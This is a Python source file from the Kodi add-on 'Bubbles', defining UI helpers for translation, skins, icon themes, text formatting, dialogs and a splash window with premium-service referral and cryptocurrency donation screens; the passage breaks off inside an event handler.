# -*- coding: utf-8 -*-

'''
	Bubbles Add-on
	Copyright (C) 2016 Bubbles

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

import xbmc
import xbmcgui
import xbmcaddon
import re
import os
import json
import urllib
import time
import datetime
from resources.lib.extensions import tools
from resources.lib.extensions import network
from resources.lib.modules import workers

class Translation(object):

	@classmethod
	def string(self, id, utf8 = True):
		if isinstance(id, (int, long)):
			# Needs ID when called from RunScript(vpn.py)
			result = xbmcaddon.Addon(tools.System.BubblesAddon).getLocalizedString(id)
		else:
			try: result = str(id)
			except: result = id
		if utf8:
			result = tools.Converter.unicode(string = result, umlaut = True).encode('utf-8')
		return result

class Skin(object):

	TypeAeonNox = 'aeon.nox'
	TypeBubblesAeonNox = 'skin.bubbles.aeon.nox'

	@classmethod
	def _directory(self):
		return xbmc.getSkinDir()

	@classmethod
	def id(self):
		return self._directory()

	# Any Aeon Nox version
	@classmethod
	def isAeonNox(self):
		return self.TypeAeonNox in self.id()

	@classmethod
	def isBubblesAeonNox(self):
		return self.TypeBubblesAeonNox in self.id()

	@classmethod
	def select(self):
		id = tools.Extensions.IdBubblesSkins
		items = ['Default', 'Bubbles 1 (Blue)']
		getMore = Format.fontBold(Translation.string(33740))
		if tools.Extensions.installed(id):
			items.extend(['Bubbles 2 (Color)', 'Minimalism (Grey)', 'Universe (Color)', 'Glass (Transparent)', 'Cinema 1 (Blue)', 'Cinema 2 (Blue)', 'Cinema 3 (Orange)', 'Cinema 4 (Red)', 'Home 1 (Color)', 'Home 2 (Blue)', 'Home 3 (Red)', 'Home 4 (White)', 'Home 5 (Black)', 'Home 6 (Blue)'])
		else:
			items.extend([getMore])
		choice = Dialog.options(title = 33337, items = items)
		if choice >= 0:
			if items[choice] == getMore:
				choice = Dialog.option(title = 33337, message = 33742, labelConfirm = 33736, labelDeny = 33743)
				if choice:
					tools.Extensions.enable(id = id)
			else:
				tools.Settings.set('interface.theme.skin', items[choice])

class Icon(object):

	TypeIcon = 'icon'
	TypeThumb = 'thumb'
	TypePoster = 'poster'
	TypeBanner = 'banner'
	TypeDefault = TypeIcon

	QualitySmall = 'small'
	QualityLarge = 'large'
	QualityDefault = QualityLarge

	SpecialNone = None
	SpecialDonations = 'donations'
	SpecialNotifications = 'notifications'

	ThemeInitialized = False
	ThemePath = None
	ThemeIcon = None
	ThemeThumb = None
	ThemePoster = None
	ThemeBanner = None

	@classmethod
	def _initialize(self, special = SpecialNone):
		if special == False or not special == self.ThemeInitialized:
			self.ThemeInitialized = special
			if special: theme = special
			else: theme = tools.Settings.getString('interface.theme.icon').lower()

			if not theme in ['default', '-', '']:

				theme = theme.replace(' ', '').lower()
				if 'glass' in theme:
					theme = theme.replace('(', '').replace(')', '')
				else:
					index = theme.find('(')
					if index >= 0: theme = theme[:index]

				addon = tools.System.pathResources() if theme in ['white', self.SpecialDonations, self.SpecialNotifications] else tools.System.pathIcons()
				self.ThemePath = os.path.join(addon, 'resources', 'media', 'icons', theme)

				quality = tools.Settings.getInteger('interface.theme.icon.quality')
				if quality == 0:
					if Skin.isAeonNox():
						self.ThemeIcon = self.QualitySmall
						self.ThemeThumb = self.QualitySmall
						self.ThemePoster = self.QualityLarge
						self.ThemeBanner = self.QualityLarge
					else:
						self.ThemeIcon = self.QualityLarge
						self.ThemeThumb = self.QualityLarge
						self.ThemePoster = self.QualityLarge
						self.ThemeBanner = self.QualityLarge
				elif quality == 1:
					self.ThemeIcon = self.QualitySmall
					self.ThemeThumb = self.QualitySmall
					self.ThemePoster = self.QualitySmall
					self.ThemeBanner = self.QualitySmall
				elif quality == 2:
					self.ThemeIcon = self.QualityLarge
					self.ThemeThumb = self.QualityLarge
					self.ThemePoster = self.QualityLarge
					self.ThemeBanner = self.QualityLarge
				else:
					self.ThemeIcon = self.QualityLarge
					self.ThemeThumb = self.QualityLarge
					self.ThemePoster = self.QualityLarge
					self.ThemeBanner = self.QualityLarge

	@classmethod
	def path(self, icon, type = TypeDefault, default = None, special = SpecialNone):
		self._initialize(special = special)
		if self.ThemePath == None:
			return default
		else:
			if type == self.TypeIcon: type = self.ThemeIcon
			elif type == self.TypeThumb: type = self.ThemeThumb
			elif type == self.TypePoster: type = self.ThemePoster
			elif type == self.TypeBanner: type = self.ThemeBanner
			else: type = self.ThemeIcon
			if not icon.endswith('.png'): icon += '.png'
			return os.path.join(self.ThemePath, type, icon)

	@classmethod
	def pathAll(self, icon, default = None, special = SpecialNone):
		return (
			self.pathIcon(icon = icon, default = default, special = special),
			self.pathThumb(icon = icon, default = default, special = special),
			self.pathPoster(icon = icon, default = default, special = special),
			self.pathBanner(icon = icon, default = default, special = special)
		)

	@classmethod
	def pathIcon(self, icon, default = None, special = SpecialNone):
		return self.path(icon = icon, type = self.TypeIcon, default = default, special = special)

	@classmethod
	def pathThumb(self, icon, default = None, special = SpecialNone):
		return self.path(icon = icon, type = self.TypeThumb, default = default, special = special)

	@classmethod
	def pathPoster(self, icon, default = None, special = SpecialNone):
		return self.path(icon = icon, type = self.TypePoster, default = default, special = special)

	@classmethod
	def pathBanner(self, icon, default = None, special = SpecialNone):
		return self.path(icon = icon, type = self.TypeBanner, default = default, special = special)

	@classmethod
	def select(self):
		id = tools.Extensions.IdBubblesIcons
		items = ['Default', 'White']
		getMore = Format.fontBold(Translation.string(33739))
		if tools.Extensions.installed(id):
			items.extend(['Black', 'Glass (Light)', 'Glass (Dark)', 'Shadow (Grey)', 'Fossil (Grey)', 'Navy (Blue)', 'Cerulean (Blue)', 'Sky (Blue)', 'Pine (Green)', 'Lime (Green)', 'Ruby (Red)', 'Candy (Red)', 'Tiger (Orange)', 'Pineapple (Yellow)', 'Violet (Purple)', 'Magenta (Pink)', 'Amber (Brown)'])
		else:
			items.extend([getMore])
		choice = Dialog.options(title = 33338, items = items)
		if choice >= 0:
			if items[choice] == getMore:
				choice = Dialog.option(title = 33338, message = 33741, labelConfirm = 33736, labelDeny = 33743)
				if choice:
					tools.Extensions.enable(id = id)
			else:
				tools.Settings.set('interface.theme.icon', items[choice])

class Format(object):

	ColorSpecial = 'FF6C3483'
	ColorUltra = 'FF2396FF'
	ColorExcellent = 'FF1E8449'
	ColorGood = 'FF668D2E'
	ColorMedium = 'FFB7950B'
	ColorPoor = 'FFBA4A00'
	ColorBad = 'FF922B21'
	ColorAlternative = 'FF004F98'

	FontNewline = '[CR]'
	FontSeparator = ' | '
	FontDivider = ' - '
	FontSplitInterval = 50

	@classmethod
	def colorToRgb(self, hex):
		return [int(hex[i:i+2], 16) for i in range(2,8,2)]

	@classmethod
	def colorToHex(self, rgb):
		rgb = [int(i) for i in rgb]
		return 'FF' + ''.join(['0{0:x}'.format(i) if i < 16 else '{0:x}'.format(i) for i in rgb])

	@classmethod
	def colorGradient(self, startHex, endHex, count = 10):
		# http://bsou.io/posts/color-gradients-with-python
		start = self.colorToRgb(startHex)
		end = self.colorToRgb(endHex)
		colors = [start]
		for i in range(1, count):
			vector = [int(start[j] + (float(i) / (count-1)) * (end[j] - start[j])) for j in range(3)]
			colors.append(vector)
		return [self.colorToHex(i) for i in colors]

	@classmethod
	def colorGradientIncrease(self, count = 10):
		return self.colorGradient(self.ColorBad, self.ColorExcellent, count)

	@classmethod
	def colorGradientDecrease(self, count = 10):
		return self.colorGradient(self.ColorExcellent, self.ColorBad, count)

	@classmethod
	def colorChange(self, color, change = 10):
		color = self.colorToRgb(color)
		color = [i + change for i in color]
		color = [min(255, max(0, i)) for i in color]
		return self.colorToHex(color)

	@classmethod
	def colorLighter(self, color, change = 10):
		return self.colorChange(color, change)

	@classmethod
	def colorDarker(self, color, change = 10):
		return self.colorChange(color, -change)

	@classmethod
	def __translate(self, label):
		return Translation.string(label)

	@classmethod
	def font(self, label, color = None, bold = None, italic = None, light = None, uppercase = None, lowercase = None, capitalcase = None, newline = None, separator = None):
		label = self.__translate(label)
		if label:
			if color:
				label = self.fontColor(label, color)
			if bold:
				label = self.fontBold(label)
			if italic:
				label = self.fontItalic(label)
			if light:
				label = self.fontLight(label)
			if uppercase:
				label = self.fontUppercase(label)
			elif lowercase:
				label = self.fontLowercase(label)
			elif capitalcase:
				label = self.fontCapitalcase(label)
			if newline:
				label += self.fontNewline()
			if separator:
				label += self.fontSeparator()
			return label
		else:
			return ''

	@classmethod
	def fontColor(self, label, color):
		if len(color) == 6: color = 'FF' + color
		label = self.__translate(label)
		return '[COLOR ' + color + ']' + label + '[/COLOR]'

	@classmethod
	def fontBold(self, label):
		label = self.__translate(label)
		return '[B]' + label + '[/B]'

	@classmethod
	def fontItalic(self, label):
		label = self.__translate(label)
		return '[I]' + label + '[/I]'

	@classmethod
	def fontLight(self, label):
		label = self.__translate(label)
		return '[LIGHT]' + label + '[/LIGHT]'

	@classmethod
	def fontUppercase(self, label):
		label = self.__translate(label)
		return '[UPPERCASE]' + label + '[/UPPERCASE]'

	@classmethod
	def fontLowercase(self, label):
		label = self.__translate(label)
		return '[LOWERCASE]' + label + '[/LOWERCASE]'

	@classmethod
	def fontCapitalcase(self, label):
		label = self.__translate(label)
		return '[CAPITALIZE]' + label + '[/CAPITALIZE]'

	@classmethod
	def fontNewline(self):
		return self.FontNewline

	@classmethod
	def fontSeparator(self):
		return self.FontSeparator

	@classmethod
	def fontDivider(self):
		return self.FontDivider

	@classmethod
	def fontSplit(self, label, interval = None, type = None):
		if not interval: interval = self.FontSplitInterval
		if not type: type = self.FontNewline
		return re.sub('(.{' + str(interval) + '})', '\\1' + type, label, 0, re.DOTALL)

	# Synonyms

	@classmethod
	def color(self, label, color):
		return self.fontColor(label, color)

	@classmethod
	def bold(self, label):
		return self.fontBold(label)

	@classmethod
	def italic(self, label):
		return self.fontItalic(label)

	@classmethod
	def light(self, label):
		return self.fontLight(label)

	@classmethod
	def uppercase(self, label):
		return self.fontUppercase(label)

	@classmethod
	def lowercase(self, label):
		return self.fontLowercase(label)

	@classmethod
	def capitalcase(self, label):
		return self.fontCapitalcase(label)

	@classmethod
	def newline(self):
		return self.fontNewline()

	@classmethod
	def separator(self):
		return self.fontSeparator()

	@classmethod
	def divider(self):
		return self.fontDivider()

	@classmethod
	def split(self, label, interval = None, type = None):
		return self.fontSplit(label = label, interval = interval, type = type)

class Changelog(object):

	@classmethod
	def show(self):
		path = os.path.join(tools.System.path(), 'changelog.txt')
		file = open(path)
		text = file.read()
		file.close()
		id = 10147
		xbmc.executebuiltin('ActivateWindow(%d)' % id)
		time.sleep(0.5)
		window = xbmcgui.Window(id)
		retry = 50
		while retry > 0:
			try:
				time.sleep(0.01)
				retry -= 1
				window.getControl(1).setLabel(tools.System.name() + ' ' + Translation.string(33503))
				window.getControl(5).setText(text)
				return
			except:
				pass

class Dialog(object):

	IconPlain = 'logo'
	IconInformation = 'information'
	IconWarning = 'warning'
	IconError = 'error'
	IconSuccess = 'success'

	IconNativeLogo = 'nativelogo'
	IconNativeInformation = 'nativeinformation'
	IconNativeWarning = 'nativewarning'
	IconNativeError = 'nativeerror'

	InputAlphabetic = xbmcgui.INPUT_ALPHANUM # Standard keyboard
	InputNumeric = xbmcgui.INPUT_NUMERIC # Format: #
	InputDate = xbmcgui.INPUT_DATE # Format: DD/MM/YYYY
	InputTime = xbmcgui.INPUT_TIME # Format: HH:MM
	InputIp = xbmcgui.INPUT_IPADDRESS # Format: #.#.#.#
	InputPassword = xbmcgui.INPUT_PASSWORD # Returns MD55 hash of input and the input is masked.

	# Numbers/values must correspond with Kodi
	BrowseFile = 1
	BrowseImage = 2
	BrowseDirectoryRead = 0
	BrowseDirectoryWrite = 3
	BrowseDefault = BrowseFile

	# Close all open dialog.
	# Sometimes if you open a dialog right after this, it also clauses. Might need some sleep to prevent this. sleep in ms.
	@classmethod
	def closeAll(self, sleep = None):
		xbmc.executebuiltin('Dialog.Close(all,true)')
		if sleep: time.sleep(sleep / 1000.0)

	@classmethod
	def closeAllProgress(self, sleep = None):
		xbmc.executebuiltin('Dialog.Close(progressdialog,true)')
		if sleep: time.sleep(sleep / 1000.0)

	@classmethod
	def aborted(self):
		return xbmc.abortRequested

	@classmethod
	def confirm(self, message, title = None):
		return xbmcgui.Dialog().ok(self.title(title), self.__translate(message))

	@classmethod
	def select(self, items, title = None):
		return xbmcgui.Dialog().select(self.title(title), items)

	@classmethod
	def option(self, message, labelConfirm = None, labelDeny = None, title = None):
		if not labelConfirm == None:
			labelConfirm = self.__translate(labelConfirm)
		if not labelDeny == None:
			labelDeny = self.__translate(labelDeny)
		return xbmcgui.Dialog().yesno(self.title(title), self.__translate(message), yeslabel = labelConfirm, nolabel = labelDeny)

	@classmethod
	def options(self, items, title = None):
		return xbmcgui.Dialog().select(self.title(title), list = items)

	# icon: icon or path to image file.
	# titleless: Without Bubbles at the front of the title.
	@classmethod
	def notification(self, message, icon = None, time = 3000, sound = False, title = None, titleless = False):
		if icon and not (icon.startswith('http') or icon.startswith('ftp') or tools.File.exists(icon)):
			icon = icon.lower()
			if icon == self.IconNativeInformation: icon = xbmcgui.NOTIFICATION_INFO
			elif icon == self.IconNativeWarning: icon = xbmcgui.NOTIFICATION_WARNING
			elif icon == self.IconNativeError: icon = xbmcgui.NOTIFICATION_ERROR
			else:
				if icon == self.IconPlain or icon == self.IconNativeLogo: icon = 'plain'
				elif icon == self.IconWarning: icon = 'warning'
				elif icon == self.IconError: icon = 'error'
				elif icon == self.IconSuccess: icon = 'success'
				else: icon = 'information'
				icon = Icon.pathIcon(icon = icon, special = Icon.SpecialNotifications)
		xbmcgui.Dialog().notification(self.title(title, titleless = titleless), self.__translate(message), icon, time, sound = sound)

	@classmethod
	def progress(self, message = None, background = False, title = None):
		if background:
			dialog = xbmcgui.DialogProgressBG()
		else:
			dialog = xbmcgui.DialogProgress()
		if not message:
			message = ''
		else:
			message = self.__translate(message)
		title = self.title(title)
		dialog.create(title, message)
		if background:
			dialog.update(0, title, message)
		else:
			dialog.update(0, message)
		return dialog

	# verify: Existing MD5 password string to compare against.
	# confirm: Confirm password. Must be entered twice
	# hidden: Hides alphabetic input.
	# default: Default set input.
	@classmethod
	def input(self, type = InputAlphabetic, verify = False, confirm = False, hidden = False, default = None, title = None):
		default = '' if default == None else default
		if verify:
			option = xbmcgui.PASSWORD_VERIFY
			if isinstance(verify, basestring):
				default = verify
		elif confirm:
			option = 0
		elif hidden:
			option = xbmcgui.ALPHANUM_HIDE_INPUT
		else:
			option = None
		# NB: Although the default parameter is given in the docs, it seems that the parameter is not actually called "default". Hence, pass it in as an unmaed parameter.
		if option == None: result = xbmcgui.Dialog().input(self.title(title), default, type = type)
		else: result = xbmcgui.Dialog().input(self.title(title), default, type = type, option = option)

		if verify:
			return not result == ''
		else:
			return result

	@classmethod
	def inputPassword(self, verify = False, confirm = False, title = None):
		return self.input(title = title, type = self.InputPassword, verify = verify, confirm = confirm)

	@classmethod
	def browse(self, type = BrowseDefault, default = None, multiple = False, mask = [], title = None):
		if default == None: default = tools.System.pathHome()
		if mask == None: mask = []
		elif isinstance(mask, basestring): mask = [mask]
		for i in range(len(mask)):
			mask[i] = mask[i].lower()
			if not mask[i].startswith('.'):
				mask[i] = '.' + mask[i]
		mask = '|'.join(mask)
		return xbmcgui.Dialog().browse(type, self.title(title), 'files', mask, True, False, default, multiple)

	# Creates an information dialog.
	# Either a list of item categories, or a list of items.
	#	[
	#		{'title' : 'Category 1', 'items' : [{'title' : 'Name 1', 'value' : 'Value 1', 'link' : True}, {'title' : 'Name 2', 'value' : 'Value 2'}]}
	#		{'title' : 'Category 2', 'items' : [{'title' : 'Name 3', 'value' : 'Value 3', 'link' : False}, {'title' : 'Name 4', 'value' : 'Value 4'}]}
	#	]
	@classmethod
	def information(self, items, title = None):
		if items == None or len(items) == 0:
			return False

		def decorate(item):
			value = item['value'] if 'value' in item else None
			label = self.__translate(item['title']) if 'title' in item else ''
			if value == None:
				label = Format.font(label, bold = True, uppercase = True)
			else:
				if not label == '':
					if not value == None:
						label += ': '
					label = Format.font(label, bold = True)
				if not value == None:
					label += Format.font(self.__translate(item['value']), italic = ('link' in item and item['link']))
			return label

		result = []
		for item in items:
			if 'items' in item:
				if not len(result) == 0:
					result.append('')
				result.append(decorate(item))
				for i in item['items']:
					result.append(decorate(i))
			else:
				result.append(decorate(item))

		return self.select(result, title = title)

	@classmethod
	def __translate(self, string):
		return Translation.string(string)

	@classmethod
	def title(self, extension = None, bold = True, titleless = False):
		title = '' if titleless else tools.System.name().encode('utf-8')
		if not extension == None:
			if not titleless:
				title += Format.divider()
			title += self.__translate(extension)
		if bold:
			title = Format.fontBold(title)
		return title

class Splash(xbmcgui.WindowDialog):

	# Types
	TypeFull = 'full'
	TypeMini = 'mini'
	TypeAbout = 'about'
	TypeDonations = 'donations'

	# Actions
	ActionSelectItem = 7
	ActionPreviousMenu = 10
	ActionNavigationBack = 92
	ActionMoveRight = 2
	ActionMoveLeft = 1
	ActionsCancel = [ActionPreviousMenu, ActionNavigationBack, ActionMoveRight]
	ActionsMaximum = 100 # Mouse other unwanted actions.

	def __init__(self, type, currency = tools.Donations.CurrencyNone):
		Loader.show()

		from resources.lib.extensions import debrid
		self.mType = type
		self.mSplash = None
		self.mWidth = 1920 # Due to setCoordinateResolution
		self.mHeight = 1080 # Due to setCoordinateResolution

		self.mButtonPremiumize = None
		self.mButtonRealDebrid = None
		self.mButtonEasyNews = None
		self.mButtonFreeHosters = None
		self.mButtonCoinBase = None
		self.mButtonExodus = None
		self.mButtonClose = None

		try:
			self.setCoordinateResolution(0)

			if type == self.TypeMini:
				width = 1000
				height = 350
				x = self.__centerX(width)
				y = self.__centerY(height)
				path = os.path.join(self.__skin(), 'splash', 'mini.png')
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))
			elif type == self.TypeFull:
				widthTotal = 1200
				heightTotal = 750
				white = '0xFFFFFFFF'
				center = 0x00000002 | 0x00000004

				width = widthTotal
				height = heightTotal
				x = self.__centerX(widthTotal)
				y = self.__centerY(heightTotal)
				path = os.path.join(self.__skin(), 'splash', 'full.png')
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

				width = widthTotal
				height = heightTotal
				x = self.__centerX(widthTotal)
				y = self.__centerY(heightTotal) + 15
				label = 'Bubbles is optimized for premium services ' + Format.fontBold('Premiumize') + ', ' + Format.fontBold('RealDebrid') + ', and ' + Format.fontBold('EasyNews') + Format.fontNewline() + 'to facilitate additional, faster, and higher quality streams. Purchase an account by' + Format.fontNewline() + 'clicking the buttons below and support the addon development at the same time.'
				self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center))

				# PREMIUMIZE

				width = 300
				height = 70
				x = self.__centerX(widthTotal) + 120
				y = self.__centerY(heightTotal) + 460
				pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
				pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
				label = Format.fontBold('       Get Premiumize')
				self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
				self.mButtonPremiumize = (x, y)

				width = 70
				height = 70
				x = self.__centerX(widthTotal) + 125
				y = self.__centerY(heightTotal) + 460
				path = Icon.path('premiumize.png', type = Icon.ThemeIcon)
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

				width = 300
				height = 20
				x = self.__centerX(widthTotal) + 120
				y = self.__centerY(heightTotal) + 540
				label = 'Torrents | Usenet | Hosters'
				self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center, font = 'font10'))

				# REALDEBRID

				width = 300
				height = 70
				x = self.__centerX(widthTotal) + 450
				y = self.__centerY(heightTotal) + 460
				pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
				pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
				label = Format.fontBold('       Get RealDebrid')
				self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
				self.mButtonRealDebrid = (x, y)

				width = 70
				height = 70
				x = self.__centerX(widthTotal) + 455
				y = self.__centerY(heightTotal) + 460
				path = Icon.path('realdebrid.png', type = Icon.ThemeIcon)
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

				width = 300
				height = 20
				x = self.__centerX(widthTotal) + 450
				y = self.__centerY(heightTotal) + 540
				label = 'Torrents | Hosters'
				self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center, font = 'font10'))

				# EASYNEWS

				width = 300
				height = 70
				x = self.__centerX(widthTotal) + 780
				y = self.__centerY(heightTotal) + 460
				pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
				pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
				label = Format.fontBold('       Get EasyNews')
				self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
				self.mButtonEasyNews = (x, y)

				width = 70
				height = 70
				x = self.__centerX(widthTotal) + 785
				y = self.__centerY(heightTotal) + 460
				path = Icon.path('easynews.png', type = Icon.ThemeIcon)
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

				width = 300
				height = 20
				x = self.__centerX(widthTotal) + 780
				y = self.__centerY(heightTotal) + 540
				label = 'Usenet'
				self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center, font = 'font10'))

				# FREE HOSTERS

				width = 300
				height = 70
				x = self.__centerX(widthTotal) + 450
				y = self.__centerY(heightTotal) + 580
				pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
				pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
				label = Format.fontBold('       Free Hosters')
				self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
				self.mButtonFreeHosters = (x, y)

				width = 70
				height = 70
				x = self.__centerX(widthTotal) + 455
				y = self.__centerY(heightTotal) + 580
				path = Icon.path('networks.png', type = Icon.ThemeIcon)
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

				width = 500
				height = 20
				x = self.__centerX(widthTotal) + 350
				y = self.__centerY(heightTotal) + 660
				label = 'Free Access | Fewer Streams | Lower Quality'
				self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center, font = 'font10'))

			elif type == self.TypeAbout:
				widthTotal = 1200
				heightTotal = 750
				white = '0xFFFFFFFF'
				center = 0x00000002 | 0x00000004

				width = widthTotal
				height = heightTotal
				x = self.__centerX(widthTotal)
				y = self.__centerY(heightTotal) + 20
				path = os.path.join(self.__skin(), 'splash', 'full.png')
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

				width = widthTotal
				height = heightTotal
				x = self.__centerX(widthTotal)
				y = self.__centerY(heightTotal) + 10
				label = Format.fontBold(Translation.string(33359) + ' ' + tools.System.version())
				label += Format.newline() + Format.fontBold(tools.Settings.getString('link.website', raw = True))
				self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center))

				width = widthTotal
				height = 150
				x = self.__centerX(widthTotal)
				y = self.__centerY(heightTotal) + 445
				label = Format.fontBold(tools.System.disclaimer())
				label = label.split(' ')
				span = 13
				label = [' '.join(label[i : i + span]) for i in range(0, len(label), span)]
				label = Format.newline().join(label)
				self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center, font = 'font10'))

				width = 200
				height = 70
				x = self.__centerX(widthTotal) + 500
				y = self.__centerY(heightTotal) + 620
				pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
				pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
				label = Format.fontBold('       Close')
				self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
				self.mButtonClose = (x, y)

				width = 70
				height = 70
				x = self.__centerX(widthTotal) + 505
				y = self.__centerY(heightTotal) + 620
				path = Icon.path('error.png', type = Icon.ThemeIcon)
				self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

			elif type == self.TypeDonations:
				try:
					data = urllib.urlopen(network.Networker.linkJoin(tools.Settings.getString('link.website', raw = True), 'web', 'resources', 'donations.json')).read()
					data = json.loads(data)
					donationAddress = data[currency]['address']
					donationLink = data[currency]['link']
					donationQrcode = data[currency]['qrcode']['plain']

					from resources.lib.extensions import clipboard
					clipboard.Clipboard.copy(donationAddress)

					if currency == tools.Donations.CurrencyBitcoin: color = 'F7931A'
					elif currency == tools.Donations.CurrencyEthereum: color = '62688F'
					elif currency == tools.Donations.CurrencyLitecoin: color = 'BEBEBE'
					elif currency == tools.Donations.CurrencyDash: color = '1C75BC'
					elif currency == tools.Donations.CurrencyAugur: color = '602952'
					elif currency == tools.Donations.CurrencyGolem: color = '00AFBF'
					elif currency == tools.Donations.CurrencyDogecoin: color = 'BA9F33'
					else: color = 'FFFFFF'

					widthTotal = 1200
					heightTotal = 750
					white = '0xFFFFFFFF'
					center = 0x00000002 | 0x00000004

					width = widthTotal
					height = heightTotal
					x = self.__centerX(widthTotal)
					y = self.__centerY(heightTotal) + 20
					path = os.path.join(self.__skin(), 'splash', 'full.png')
					self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

					width = 180
					height = 180
					x = self.__centerX(widthTotal) + 120
					y = self.__centerY(heightTotal) + 365
					self.addControl(xbmcgui.ControlImage(x, y, width, height, donationQrcode))

					width = 800
					height = 200
					x = self.__centerX(widthTotal) + 340
					y = self.__centerY(heightTotal) + 350
					label = Format.fontBold(Translation.string(33506))
					self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, font = 'font10'))

					width = widthTotal
					height = 50
					x = self.__centerX(widthTotal)
					y = self.__centerY(heightTotal) + 565
					label = Format.font(Translation.string(33507) + ': ' + donationAddress, bold = True, color = color)
					self.addControl(xbmcgui.ControlLabel(x, y, width, height, label, textColor = white, alignment = center, font = 'font15'))

					width = 250
					height = 70
					x = self.__centerX(widthTotal) + 170
					y = self.__centerY(heightTotal) + 620
					pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
					pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
					label = Format.fontBold('       CoinBase')
					self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
					self.mButtonCoinBase = (x, y)

					width = 70
					height = 70
					x = self.__centerX(widthTotal) + 175
					y = self.__centerY(heightTotal) + 620
					path = Icon.path('coinbase.png', type = Icon.ThemeIcon)
					self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

					width = 250
					height = 70
					x = self.__centerX(widthTotal) + 475
					y = self.__centerY(heightTotal) + 620
					pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
					pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
					label = Format.fontBold('       Exodus')
					self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
					self.mButtonExodus = (x, y)

					width = 70
					height = 70
					x = self.__centerX(widthTotal) + 480
					y = self.__centerY(heightTotal) + 620
					path = Icon.path('exodus.png', type = Icon.ThemeIcon)
					self.addControl(xbmcgui.ControlImage(x, y, width, height, path))

					width = 250
					height = 70
					x = self.__centerX(widthTotal) + 780
					y = self.__centerY(heightTotal) + 620
					pathFocus = os.path.join(self.__skin(), 'splash', 'buttonsmallfocus.png')
					pathNormal = os.path.join(self.__skin(), 'splash', 'buttonsmallnormal.png')
					label = Format.fontBold('       Close')
					self.addControl(xbmcgui.ControlButton(x, y, width, height, label, focusTexture = pathFocus, noFocusTexture = pathNormal, alignment = center, textColor = white))
					self.mButtonClose = (x, y)

					width = 70
					height = 70
					x = self.__centerX(widthTotal) + 785
					y = self.__centerY(heightTotal) + 620
					path = Icon.path('error.png', type = Icon.ThemeIcon)
					self.addControl(xbmcgui.ControlImage(x, y, width, height, path))
				except:
					tools.Logger.error()
					tools.System.openLink(tools.Settings.getString('link.donation', raw = True))
		except:
			pass
		Loader.hide()

	def __skin(self):
		theme = tools.Settings.getString('interface.theme.skin').lower()
		theme = theme.replace(' ', '').lower()
		index = theme.find('(')
		if index >= 0: theme = theme[:index]
		addon = tools.System.pathResources() if theme == 'default' or theme == 'bubbles1' else tools.System.pathSkins()
		return os.path.join(addon, 'resources', 'media', 'skins', theme)

	def __centerX(self, width):
		return int((self.mWidth - width) / 2)

	def __centerY(self, height):
		return int((self.mHeight - height) / 2)

	def __referalPremiumize(self):
		from resources.lib.extensions import debrid
		debrid.Premiumize.website(open = True)
		self.close()

	def __referalRealDebrid(self):
		from resources.lib.extensions import debrid
		debrid.RealDebrid.website(open = True)
		self.close()

	def __referalEasyNews(self):
		from resources.lib.extensions import debrid
		debrid.EasyNews.website(open = True)
		self.close()

	def __referalCoinBase(self):
		tools.Donations.coinbase(openLink = True)
		self.close()

	def __referalExodus(self):
		tools.Donations.exodus(openLink = True)
		self.close()

	def __continue(self):
		if self.mType == self.TypeFull:
			tools.System.openLink(tools.Settings.getString('link.website', raw = True), popup = False, front = False)
		self.close()

	def onControl(self, control):
		distances = []
